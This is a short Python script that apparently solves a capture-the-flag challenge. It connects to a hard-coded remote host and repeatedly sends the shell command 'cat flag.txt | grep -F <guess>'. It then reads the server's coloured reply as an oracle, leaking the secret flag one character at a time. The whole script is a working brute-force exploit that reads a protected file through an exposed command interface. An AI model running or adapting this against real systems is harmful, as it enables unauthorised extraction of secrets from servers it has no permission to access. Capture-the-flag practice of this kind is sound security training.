from pwn import *

s = remote("35.154.114.180", 9876)
a = "ABCDEFGHIJKLMNOPQRSTUVWZYZabcdefghijklmnopqrstuvwxyz_1234567890{}"

flag = "WHL{ON3A8Z33E1SZQ72QZFIH}"

while flag[-1] != "}":
    for c in a:
        s.recvuntil(">")
        _flag = flag + c
        # print(('cat flag.txt | grep -F {}\n'.format(_flag)))
        # print(_flag)
        s.send('cat flag.txt | grep -F {}\n'.format(_flag))
        rc = (s.recvline().strip())
        # print(rc)
        if rc != b'\x1b[32m1':
            flag += c
            print(flag)
            break
